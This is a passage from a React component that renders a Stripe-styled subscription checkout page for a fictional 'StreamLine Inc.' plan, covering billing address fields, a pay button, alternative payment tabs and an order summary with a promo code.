                <input type="text" value={nameOnCard} onChange={handleNameChange} onBlur={() => handleBlur('nameOnCard')} onFocus={() => handleFocus('nameOnCard')} className={`w-full px-3 py-2.5 rounded-md border text-[14px] text-[#1a1a1a] outline-none transition-all duration-150 bg-white ${getInputBorderClass('nameOnCard')}`} />
                {errors.nameOnCard && touched.nameOnCard && <div className="flex items-center gap-1.5 mt-1.5"><AlertCircle className="w-3.5 h-3.5 text-[#df1b41]" /><span className="text-[12px] text-[#df1b41]">{errors.nameOnCard}</span></div>}
              </div>

              {/* Billing Address */}
              <div className="mb-4">
                <label className="block text-[13px] font-medium text-[#3c4257] mb-1.5">Billing address</label>
                <div className="rounded-md border border-[#e0e0e0] overflow-hidden">
                  <div ref={countryRef} className="relative border-b border-[#e0e0e0]">
                    <button onClick={() => setShowCountryDropdown(prev => !prev)} className="w-full flex items-center justify-between px-3 py-2.5 text-[14px] text-[#1a1a1a] bg-white hover:bg-[#fafafa] transition-colors duration-150">
                      <span>{country}</span>
                      <ChevronDown className="w-4 h-4 text-[#6d6e78]" />
                    </button>
                    {showCountryDropdown && (
                      <div className="absolute top-full left-0 right-0 bg-white border border-[#e0e0e0] rounded-md shadow-lg z-50 max-h-48 overflow-y-auto">
                        {countries.map((c) => (
                          <button key={c} onClick={() => handleCountrySelect(c)} className={`w-full text-left px-3 py-2 text-[14px] hover:bg-[#f0f5ff] transition-colors duration-100 ${c === country ? 'bg-[#f0f5ff] text-[#0570de]' : 'text-[#1a1a1a]'}`}>{c}</button>
                        ))}
                      </div>
                    )}
                  </div>

                  <div className="border-b border-[#e0e0e0]">
                    <input type="text" value={addressLine1} onChange={handleAddressLine1Change} onFocus={() => handleFocus('address1')} onBlur={() => setFocusedField('')} placeholder="Address line 1" className={`w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white ${focusedField === 'address1' ? 'shadow-[0_0_0_1px_#0570de] relative z-10' : ''}`} />
                  </div>

                  <div className="border-b border-[#e0e0e0]">
                    <input type="text" value={addressLine2} onChange={handleAddressLine2Change} onFocus={() => handleFocus('address2')} onBlur={() => setFocusedField('')} placeholder="Address line 2 (optional)" className={`w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white ${focusedField === 'address2' ? 'shadow-[0_0_0_1px_#0570de] relative z-10' : ''}`} />
                  </div>

                  <div className="flex">
                    <div className="flex-1 border-r border-[#e0e0e0]">
                      <input type="text" value={city} onChange={handleCityChange} onFocus={() => handleFocus('city')} onBlur={() => setFocusedField('')} placeholder="City" className={`w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white ${focusedField === 'city' ? 'shadow-[0_0_0_1px_#0570de] rounded-bl-md relative z-10' : ''}`} />
                    </div>
                    {country === 'United States' && (
                      <div ref={stateRef} className="flex-1 border-r border-[#e0e0e0] relative">
                        <button onClick={() => setShowStateDropdown(prev => !prev)} className="w-full flex items-center justify-between px-3 py-2.5 text-[14px] bg-white hover:bg-[#fafafa] transition-colors duration-150">
                          <span className={stateField ? 'text-[#1a1a1a]' : 'text-[#a3a3a3]'}>{stateField || 'State'}</span>
                          <ChevronDown className="w-3.5 h-3.5 text-[#6d6e78]" />
                        </button>
                        {showStateDropdown && (
                          <div className="absolute top-full left-0 right-0 bg-white border border-[#e0e0e0] rounded-md shadow-lg z-50 max-h-48 overflow-y-auto">
                            {usStates.map((s) => (
                              <button key={s} onClick={() => handleStateSelect(s)} className={`w-full text-left px-3 py-2 text-[14px] hover:bg-[#f0f5ff] transition-colors duration-100 ${s === stateField ? 'bg-[#f0f5ff] text-[#0570de]' : 'text-[#1a1a1a]'}`}>{s}</button>
                            ))}
                          </div>
                        )}
                      </div>
                    )}
                    <div className="flex-1">
                      <input type="text" value={zip} onChange={handleZipChange} onBlur={() => handleBlur('zip')} onFocus={() => handleFocus('zip')} placeholder="ZIP" className={`w-full px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white ${focusedField === 'zip' ? 'shadow-[0_0_0_1px_#0570de] rounded-br-md relative z-10' : ''}`} />
                    </div>
                  </div>
                </div>
                {errors.zip && touched.zip && <div className="flex items-center gap-1.5 mt-1.5"><AlertCircle className="w-3.5 h-3.5 text-[#df1b41]" /><span className="text-[12px] text-[#df1b41]">{errors.zip}</span></div>}
              </div>

              {/* Phone */}
              <div className="mb-5">
                <div className="flex items-center gap-1 mb-1.5">
                  <label className="text-[13px] font-medium text-[#3c4257]">Phone number</label>
                  <span className="text-[12px] text-[#8898aa]">(optional)</span>
                </div>
                <div className={`flex items-center rounded-md border transition-all duration-150 bg-white overflow-hidden ${focusedField === 'phone' ? 'border-[#0570de] shadow-[0_0_0_1px_#0570de]' : 'border-[#e0e0e0]'}`}>
                  <div className="flex items-center gap-1 pl-3 pr-2 border-r border-[#e0e0e0]">
                    <span className="text-[14px]">{countryPhoneCodes[country]?.flag}</span>
                    <span className="text-[14px] text-[#6d6e78]">{countryPhoneCodes[country]?.code}</span>
                  </div>
                  <input type="tel" value={phone} onChange={handlePhoneChange} onFocus={() => handleFocus('phone')} onBlur={() => setFocusedField('')} placeholder="(555) 000-0000" className="flex-1 px-3 py-2.5 text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none bg-white" />
                </div>
              </div>

              {/* Save Info */}
              <div className="mb-6 flex items-start gap-3">
                <button onClick={toggleSaveInfo} className="mt-0.5 flex-shrink-0">
                  <div className={`w-4 h-4 rounded-[3px] border flex items-center justify-center transition-all duration-150 ${saveInfo ? 'bg-[#0570de] border-[#0570de]' : 'border-[#c4c4c4] bg-white'}`}>
                    {saveInfo && <Check className="w-3 h-3 text-white" strokeWidth={3} />}
                  </div>
                </button>
                <div>
                  <p className="text-[13px] text-[#3c4257] leading-snug">Securely save my information for 1-click checkout</p>
                  <p className="text-[12px] text-[#8898aa] mt-0.5 leading-snug">Pay faster on StreamLine Inc. and everywhere Link is accepted.</p>
                </div>
              </div>

              {/* Pay Button */}
              <button onClick={handleSubmit} disabled={isProcessing} className={`w-full py-3 rounded-md text-white text-[15px] font-semibold transition-all duration-200 ${isProcessing ? 'bg-[#0570de]/70 cursor-not-allowed' : 'bg-[#0570de] hover:bg-[#0452ad] active:bg-[#03409e] shadow-[0_1px_3px_rgba(0,0,0,0.12)]'}`}>
                {isProcessing ? (
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                    <span>Processing…</span>
                  </div>
                ) : (
                  <span>Pay ${total}</span>
                )}
              </button>

              <div className="mt-6 text-center">
                <p className="text-[12px] text-[#8898aa] leading-relaxed">
                  By confirming your payment, you allow StreamLine Inc. to charge your card for this payment and future payments in accordance with their terms. You can always cancel your subscription.
                </p>
              </div>

              <div className="mt-8 flex items-center justify-center gap-1.5 text-[12px] text-[#8898aa]">
                <span>Powered by</span>
                <span className="font-bold text-[#635bff] text-[14px] mr-1">stripe</span>
                <span className="text-[#d0d0d0]">|</span>
                <a href="#" className="hover:text-[#6d6e78] transition-colors duration-150 ml-1">Terms</a>
                <a href="#" className="hover:text-[#6d6e78] transition-colors duration-150">Privacy</a>
              </div>
            </div>
          )}

          {/* US Bank & Cash App sections */}
          {paymentMethod === 'us_bank' && (
            <div className="text-center py-12">
              <div className="w-14 h-14 rounded-full bg-[#f0f5ff] flex items-center justify-center mx-auto mb-4">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                  <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v4M12 14v4M16 14v4" stroke="#0570de" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
              <h3 className="text-[16px] font-semibold text-[#1a1a1a] mb-2">Pay with your bank account</h3>
              <p className="text-[14px] text-[#6d6e78] max-w-sm mx-auto mb-6">You'll be asked to log in to your bank account to complete the payment securely via ACH Direct Debit.</p>
              <button className="w-full py-3 rounded-md text-white text-[15px] font-semibold bg-[#0570de] hover:bg-[#0452ad] transition-all duration-200 shadow-[0_1px_3px_rgba(0,0,0,0.12)]">Continue with bank account</button>
            </div>
          )}

          {paymentMethod === 'cashapp' && (
            <div className="text-center py-12">
              <div className="w-14 h-14 rounded-full bg-[#00D632]/10 flex items-center justify-center mx-auto mb-4">
                <span className="text-[#00D632] text-[28px] font-bold">$</span>
              </div>
              <h3 className="text-[16px] font-semibold text-[#1a1a1a] mb-2">Pay with Cash App</h3>
              <p className="text-[14px] text-[#6d6e78] max-w-sm mx-auto mb-6">You'll be redirected to Cash App to authorize the payment. Make sure you have the Cash App installed on your device.</p>
              <button className="w-full py-3 rounded-md text-white text-[15px] font-semibold bg-[#00D632] hover:bg-[#00C02E] transition-all duration-200 shadow-[0_1px_3px_rgba(0,0,0,0.12)]">Continue with Cash App</button>
            </div>
          )}
        </div>
      </div>

      {/* Right Column - Order Summary */}
      <div className="hidden lg:block w-[420px] xl:w-[460px] bg-[#f7f8fa] border-l border-[#e8e8e8] min-h-screen">
        <div className="sticky top-0 pt-14 pl-10 xl:pl-16 pr-10">
          <div className="flex gap-4 mb-8">
            <div className="w-16 h-16 rounded-lg bg-white border border-[#e0e0e0] flex items-center justify-center shadow-sm relative">
              <div className="w-11 h-11 rounded-md bg-gradient-to-br from-[#635bff] to-[#8b5cf6]"></div>
              <div className="absolute -top-1.5 -right-1.5 w-5 h-5 bg-[#6d6e78] rounded-full flex items-center justify-center shadow-sm">
                <span className="text-white text-[10px] font-medium">1</span>
              </div>
            </div>
            <div className="flex-1">
              <div className="flex justify-between items-start">
                <div>
                  <p className="text-[14px] font-semibold text-[#1a1a1a]">Professional Plan</p>
                  <p className="text-[13px] text-[#6d6e78] mt-0.5">Annual subscription</p>
                </div>
                <span className="text-[14px] font-semibold text-[#1a1a1a]">$299.00</span>
              </div>
              <div className="flex gap-2 mt-2">
                <span className="px-2 py-0.5 bg-[#e8e8e8] rounded text-[11px] text-[#6d6e78] font-medium">Billed annually</span>
                <span className="px-2 py-0.5 bg-[#dff5e3] rounded text-[11px] text-[#30B130] font-medium">Save 20%</span>
              </div>
            </div>
          </div>

          {!showPromo ? (
            <button onClick={togglePromo} className="text-[13px] text-[#0570de] font-medium hover:text-[#0452ad] transition-colors duration-150 mb-6">+ Add promotion code</button>
          ) : (
            <div className="flex gap-2 mb-6">
              <input type="text" value={promoCode} onChange={handlePromoChange} placeholder="Promo code" className="flex-1 px-3 py-2 rounded-md border border-[#e0e0e0] text-[14px] text-[#1a1a1a] placeholder-[#a3a3a3] outline-none focus:border-[#0570de] focus:shadow-[0_0_0_1px_#0570de] transition-all duration-150 bg-white" />
              <button onClick={handleApplyPromo} className="px-4 py-2 rounded-md bg-[#0570de] text-white text-[13px] font-medium hover:bg-[#0452ad] transition-colors duration-150">Apply</button>
            </div>
          )}
          {promoApplied && (
            <div className="flex items-center gap-2 mb-4 -mt-3">
              <div className="w-4 h-4 rounded-full bg-[#30B130] flex items-center justify-center">
                <Check className="w-2.5 h-2.5 text-white" strokeWidth={3} />
              </div>
              <span className="text-[13px] text-[#30B130] font-medium">SAVE10 applied — 10% off</span>
            </div>
          )}

          <div className="border-t border-[#e0e0e0] pt-5 space-y-3">
            <div className="flex justify-between"><span className="text-[14px] text-[#6d6e78]">Subtotal</span><span className="text-[14px] text-[#1a1a1a]">$299.00</span></div>
            {promoApplied && <div className="flex justify-between"><span className="text-[14px] text-[#30B130]">Discount (10%)</span><span className="text-[14px] text-[#30B130]">-$29.90</span></div>}
            <div className="flex justify-between">
              <div className="flex items-center gap-1"><span className="text-[14px] text-[#6d6e78]">Tax</span><Info className="w-3.5 h-3.5 text-[#a3a3a3]" /></div>
              <span className="text-[14px] text-[#1a1a1a]">${tax}</span>
            </div>
          </div>

          <div className="border-t border-[#e0e0e0] mt-5 pt-5">
            <div className="flex justify-between items-center">
              <span className="text-[16px] font-semibold text-[#1a1a1a]">Total due today</span>
              <span className="text-[24px] font-semibold text-[#1a1a1a]">${total}</span>
            </div>
            <p className="text-[12px] text-[#8898aa] mt-1">Renews at $299.00/year</p>
          </div>

          <div className="mt-10 space-y-3">
            <div className="flex items-center gap-2.5"><Lock className="w-3.5 h-3.5 text-[#8898aa]" /><span className="text-[12px] text-[#8898aa]">Payments are secure and encrypted</span></div>
            <div className="flex items-center gap-2.5"><Check className="w-3.5 h-3.5 text-[#8898aa]" /><span className="text-[12px] text-[#8898aa]">30-day money-back guarantee</span></div>
            <div className="flex items-center gap-2.5"><X className="w-3.5 h-3.5 text-[#8898aa]" /><span className="text-[12px] text-[#8898aa]">Cancel anytime, no questions asked</span></div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default StripeCheckout;